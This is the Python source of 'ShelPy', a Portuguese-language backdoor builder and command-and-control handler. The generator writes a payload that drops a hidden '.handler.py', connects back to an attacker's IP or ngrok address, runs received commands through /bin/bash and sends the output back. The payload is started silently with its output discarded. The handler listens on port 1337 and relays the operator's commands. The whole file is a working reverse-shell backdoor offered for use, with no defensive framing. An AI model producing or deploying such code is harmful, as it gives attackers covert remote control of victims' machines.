#coding: utf-8
# Developer: Derxs
# Version: 1.2
import os, time, socket

def criar():
	ngrok = input("\033[01;32m[*]\033[0m"+" Ngrok [y/n]> ")

	if ngrok == "y":
		ip = input("\033[01;34m[+]\033[0m"+" IP ngrok> ")
		porta = input("\033[01;34m[+]\033[0m"+" Porta ngrok> ")
		porta_hand = input("\033[01;34m[+]\033[0m"+" Porta handler> ")
		nome = input("\033[01;34m[+]\033[0m"+" Nome da backdoor> ")
		
		arquivo = open(nome+".py", "w")	
		
		print("\033[01;32m[*]\033[0m"+" Criando backdoor...")
		
		arquivo.write("""#coding: utf-8
import os, time

arq = open(".handler.py", "w")
arq.write('''#coding: utf-8
import socket, os, subprocess

s = socket.socket()
host = {}
port = {}

s.connect((host, port))

s.send(str.encode('\033[01;31mShelPy\033[0m'+str(os.getcwd()) + '> '))

while True:
	data = s.recv(1024)

	if data[:2].decode('utf-8') == 'cd':
		os.chdir(data[3:].decode('utf-8'))
	
	if len(data) > 0:
		cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, executable='/bin/bash', stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		
		output_bytes = cmd.stdout.read() + cmd.stderr.read()

		if 'Arquivo ou diretório não encontrado' or 'File or directory not found' in str(output_bytes, 'utf-8'):
			output_str = str(cmd.stdout.read(), 'utf-8')
		else:
			output_str = str(output_bytes, 'utf-8')

		s.send(str.encode(output_str + str(os.getcwd()) + '> '))
''')

arq.close()

os.system("python3 .handler.py &>> /dev/null")
		""".format('"{}"'.format(ip), porta))
	
		arquivo.close()

		print("\033[01;32m[*]\033[0m"+" Backdoor gerada!")
	
		print("\033[01;32m[*]\033[0m"+" Aguardando conexão...")

		def socket_create():
			try:
				global host, port, s
				
				host = ''
				port = 1337

				s = socket.socket()

			except socket.error as msg:
				print('\033[01;31m[!]\033[0m Erro na criação do socket: {}'.format(msg))

		def socket_bind():
			try:
				global host, port, s
				
				s.bind((host, port))
				s.listen(5)
			
			except socket.error as msg:
				print('\033[01;31m[!]\033[0m Socket bind erro: {}\n\033[01;32m[+]\033[0m Reconectando...'.format(msg))
				socket_bind()

		def socket_accept():
			conn, address = s.accept()
			
			os.system('clear')

			print('\033[01;32m[*] IP Conectado:\033[0m {}\n'.format(address[0]))

			client_response = str(conn.recv(1024), 'utf-8')
			
			print(client_response, end='')
			
			send_commands(conn)
			conn.close()

		def send_commands(conn):
			while True:
				cmd = input()

				if cmd == 'sair':
					conn.close()
					s.close()

				if len(str.encode(cmd)) > 0:
					conn.send(str.encode(cmd))
					client_response = str(conn.recv(1024), 'utf-8')
					print(client_response, end='')

		def main_server():
			socket_create()
			socket_bind()
			socket_accept()

		main_server()
		main()
	else:
		ip = input("\033[01;34m[+]\033[0m"+" Seu IP> ")
	
		porta = input("\033[01;34m[+]\033[0m"+" Porta> ")
	
		nome = input("\033[01;34m[+]\033[0m"+" Nome da backdoor> ")
		arquivo = open(nome+".py", "w")
	
		print("\033[01;32m[*]\033[0m"+" Criando backdoor...")
	
		arquivo.write("""#coding: utf-8
import os, time

arq = open(".handler.py", "w")
arq.write('''#coding: utf-8
import socket, os, subprocess

s = socket.socket()
host = {}
port = {}

s.connect((host, port))

s.send(str.encode('\033[01;31mShelPy\033[0m'+str(os.getcwd()) + '> '))

while True:
	data = s.recv(1024)

	if data[:2].decode('utf-8') == 'cd':
		os.chdir(data[3:].decode('utf-8'))
	
	if len(data) > 0:
		cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, executable='/bin/bash', stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		
		output_bytes = cmd.stdout.read() + cmd.stderr.read()

		if 'Arquivo ou diretório não encontrado' or 'File or directory not found' in str(output_bytes, 'utf-8'):
			output_str = str(cmd.stdout.read(), 'utf-8')
		else:
			output_str = str(output_bytes, 'utf-8')

		s.send(str.encode(output_str + str(os.getcwd()) + '> '))
''')

arq.close()

os.system("python3 .handler.py &>> /dev/null")
		""".format('"{}"'.format(ip), porta))
	
		arquivo.close()

		print("\033[01;32m[*]\033[0m"+" Backdoor gerada!")
	
		print("\033[01;32m[*]\033[0m"+" Aguardando conexão...")

		def socket_create():
			try:
				global host, port, s
				
				host = ''
				port = 1337

				s = socket.socket()

			except socket.error as msg:
				print('\033[01;31m[!]\033[0m Erro na criação do socket: {}'.format(msg))

		def socket_bind():
			try:
				global host, port, s
				
				s.bind((host, port))
				s.listen(5)
			
			except socket.error as msg:
				print('\033[01;31m[!]\033[0m Socket bind erro: {}\n\033[01;32m[+]\033[0m Reconectando...'.format(msg))
				socket_bind()

		def socket_accept():
			conn, address = s.accept()
			
			os.system('clear')

			print('\033[01;32m[*] IP Conectado:\033[0m {}\n'.format(address[0]))

			client_response = str(conn.recv(1024), 'utf-8')
			
			print(client_response, end='')
			
			send_commands(conn)
			conn.close()

		def send_commands(conn):
			while True:
				cmd = input()

				if cmd == 'sair':
					conn.close()
					s.close()

				if len(str.encode(cmd)) > 0:
					conn.send(str.encode(cmd))
					client_response = str(conn.recv(1024), 'utf-8')
					print(client_response, end='')

		def main_server():
			socket_create()
			socket_bind()
			socket_accept()

		main_server()
		main()

def handler():
	porta = input("\033[01;34m[+]\033[0m"+" Porta> ")
	print("\033[01;32m[*]\033[0m"+" Aguardando conexão...")

	def socket_create():
		try:
			global host, port, s
			
			host = ''
			port = 1337

			s = socket.socket()

		except socket.error as msg:
			print('\033[01;31m[!]\033[0m Erro na criação do socket: {}'.format(msg))

	def socket_bind():
		try:
			global host, port, s
			
			s.bind((host, port))
			s.listen(5)
		
		except socket.error as msg:
			print('\033[01;31m[!]\033[0m Socket bind erro: {}\n\033[01;32m[+]\033[0m Reconectando...'.format(msg))
			socket_bind()

	def socket_accept():
		conn, address = s.accept()
		
		os.system('clear')

		print('\033[01;32m[*] IP Conectado:\033[0m {}\n'.format(address[0]))

		client_response = str(conn.recv(1024), 'utf-8')
		
		print(client_response, end='')
		
		send_commands(conn)
		conn.close()

	def send_commands(conn):
		while True:
			cmd = input()

			if cmd == 'sair':
				conn.close()
				s.close()

			if len(str.encode(cmd)) > 0:
				conn.send(str.encode(cmd))
				client_response = str(conn.recv(1024), 'utf-8')
				print(client_response, end='')

	def main_server():
		socket_create()
		socket_bind()
		socket_accept()

	main_server()

def main():
	print('''\033[01;31m
╔═╗┬ ┬┌─┐┬  ╔═╗┬ ┬
╚═╗├─┤├┤ │  ╠═╝└┬┘
╚═╝┴ ┴└─┘┴─┘╩   ┴ v1.2 by Derxs
\033[0m
\033[01;34m1)\033[0m Criar
\033[01;34m2)\033[0m Handler
\033[01;34m3)\033[0m Limpar tela
\033[01;34m4)\033[0m Sair
	''')

	try:
		opc = int(input("\033[01;35m[?]\033[0m ShelPy> "))
		if opc == 1:
			criar()
		elif opc == 2:
			handler()
		elif opc == 3:
			os.system("clear")
			main()
		else:
			exit(0)
	except ValueError:
		main()

flag = True

while flag:
	try:
		main()
	except KeyboardInterrupt:
		print("\n\033[01;31m[!]\033[0m"+" Você saiu!")
		flag = False
